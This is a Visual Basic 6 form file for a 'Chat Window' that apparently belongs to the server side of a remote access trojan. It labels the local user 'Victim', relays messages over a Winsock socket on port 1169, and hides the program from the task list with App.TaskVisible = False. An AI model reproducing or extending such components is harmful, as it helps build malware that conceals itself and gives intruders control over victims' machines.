VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "mswinsck.ocx"
Begin VB.Form Form4 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Chat Window"
   ClientHeight    =   5160
   ClientLeft      =   7095
   ClientTop       =   2820
   ClientWidth     =   5760
   ControlBox      =   0   'False
   LinkTopic       =   "Form4"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   5160
   ScaleWidth      =   5760
   Begin VB.ListBox List1 
      Appearance      =   0  'Flat
      BackColor       =   &H80000001&
      ForeColor       =   &H0000FF00&
      Height          =   4320
      Left            =   0
      TabIndex        =   2
      Top             =   0
      Width           =   5775
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Gönder"
      Height          =   855
      Left            =   5040
      TabIndex        =   1
      Top             =   4320
      Width           =   735
   End
   Begin VB.TextBox Text2 
      Appearance      =   0  'Flat
      BackColor       =   &H80000001&
      ForeColor       =   &H0000FF00&
      Height          =   855
      Left            =   0
      MultiLine       =   -1  'True
      TabIndex        =   0
      Text            =   "server_4.frx":0000
      Top             =   4320
      Width           =   5055
   End
   Begin MSWinsockLib.Winsock soket 
      Left            =   5400
      Top             =   4680
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   1169
   End
End
Attribute VB_Name = "Form4"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()
List1.AddItem (vbNewLine & "Victim : " & Text2.Text)
Form1.Winsock1.SendData "chat_client|" + Text2.Text
End Sub

Private Sub Form_Load()
App.TaskVisible = False
Form1.Timer1.Enabled = True
End Sub

Private Sub Form_Unload(Cancel As Integer)
Form1.Timer1.Enabled = False
End Sub

Private Sub Text2_Click()
Text2.Text = ""
End Sub
